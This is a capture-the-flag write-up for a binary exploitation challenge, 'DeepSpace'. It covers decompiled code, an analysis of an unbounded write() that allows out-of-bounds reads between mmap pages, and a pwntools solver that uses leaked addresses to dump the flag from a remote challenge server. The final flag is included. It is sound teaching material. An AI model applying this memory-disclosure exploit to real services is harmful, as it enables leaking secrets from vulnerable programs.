---
description: Binary Exploitation/Pwn
---

# DeepSpace

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Given a zip file that contains an ELF file and its libc and ldd. Then we proceed to decompile the ELF file and got:

main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  start_challenge();
}
```

start\_challenge:

```c
void __noreturn start_challenge()
{
  int v0; // [rsp+0h] [rbp-30h] BYREF
  int fd; // [rsp+4h] [rbp-2Ch]
  size_t nbytes; // [rsp+8h] [rbp-28h] BYREF
  void *v3; // [rsp+10h] [rbp-20h]
  void *buf; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = 0;
  v3 = mmap(0, 0x1375u, 3, 34, -1, 0);
  buf = mmap(0, 0x169u, 3, 34, -1, 0);
  while ( 1 )
  {
    print_menu();
    __isoc99_scanf("%d", &v0);
    getchar();
    switch ( v0 )
    {
      case 1:
        printf("Payload size: ");
        __isoc99_scanf("%lu", &nbytes);
        getchar();
        puts("Send your diagnostic signal!");
        read(0, buf, nbytes);
        puts("[+] Signal sent.");
        break;
      case 2:
        puts("[*] Encrypted message detected! Routing to secure buffer...");
        fd = open("./flag", 0);
        if ( fd == -1 )
        {
          perror("Error opening flag file");
          exit(1);
        }
        read(fd, v3, 0x64u);
        close(fd);
        v5 = 1;
        puts("[+] Message stored successfully");
        break;
      case 3:
        printf("Enter log size: ");
        __isoc99_scanf("%lu", &nbytes);
        getchar();
        puts("\n--- Full Diagnostic Log ---");
        write(1, buf, nbytes);
        puts("\n--- End of Full Log ---");
        break;
      case 4:
        puts("[*] Rebooting array... Goodbye.");
        exit(0);
      case 5:
        puts("\n--- Aliens Info ---");
        printf("Aliens 1: %p\n", v3);
        printf("Aliens 2: %p\n", buf);
        puts("--------------------");
        break;
      default:
        puts("[!] Invalid command.");
        break;
    }
  }
}
```

in short:

* There are two RW (Read/Write) mmap allocations:
  * **v3 = mmap(...,0x1375, PROT\_READ|PROT\_WRITE, ...):** eventually populated with the flag (Menu 2).
  * **buf =** **mmap(..., 0x169, PROT\_READ|PROT\_WRITE, ...):** the I/O buffer (Menu 1 & 3).
  * (Both are rounded up to the page size: v3 ≈ 0x2000, buf ≈ 0x1000.)
* **Menu 5** prints the addresses of **v3** and **buf** (providing an ASLR leak).
* **Menu 2** reads **./flag** into **v3** (0x64 bytes).
* **Menu 3** executes **write(1, buf, nbytes)** **WITHOUT** limits -> this allows an **OOB** (Out-Of-Bounds) read starting from **buf** and continuing to higher addresses.

Linux typically places anonymous mmaps "downwards" (meaning the first mapping is at a higher address). Since **v3** is allocated first, **address(v3) > address(buf)**, and they are usually located on adjacent pages. Therefore, if we request **nbytes = (v3 - buf) + 0x64**, the "Full Diagnostic Log" output will read past **buf**, cross the page boundary into **v3**, and capture the 0x64 bytes of the flag.

solver.py:

```python
from pwn import *
import re

#io = process('./chall_patched')
io = remote('103.185.52.103', 2001)

def menu(x):
    io.sendlineafter(b'> ', str(x).encode())

# 1) Leak alamat
menu(5)
io.recvuntil(b'Aliens 1: ')
v3 = int(io.recvline().strip(), 16)
io.recvuntil(b'Aliens 2: ')
buf = int(io.recvline().strip(), 16)
log.info(f'v3={hex(v3)} buf={hex(buf)}')

# 2) Load flag ke v3
menu(2)
io.recvuntil(b'Message stored successfully')

# 3) Hitung nbytes untuk melintasi ke v3 dan ambil 0x64 byte flag
FLAG_LEN = 0x64
L = (v3 - buf) + FLAG_LEN
assert L > 0

# 4) Dump OOB dari buf hingga ke v3
menu(3)
io.sendlineafter(b'Enter log size: ', str(L).encode())
io.recvuntil(b'--- Full Diagnostic Log ---\n')
dump = io.recvuntil(b'\n--- End of Full Log ---', drop=True)

# 5) Ekstrak flag dari offset v3-buf
off = v3 - buf
flag_bytes = dump[off:off+FLAG_LEN]
try:
    print(flag_bytes.decode())
except:
    print(flag_bytes)

io.close()
```

if we run it, we get the flag:

<figure><img src="../../../.gitbook/assets/unknown (3).png" alt=""><figcaption></figcaption></figure>

#### Flag: SCH25{Kur4ng\_T4hU\_Ju9A\_Y4H\_muNgKiN\_SuaTu\_s4At\_b4KaL\_When\_Yh}
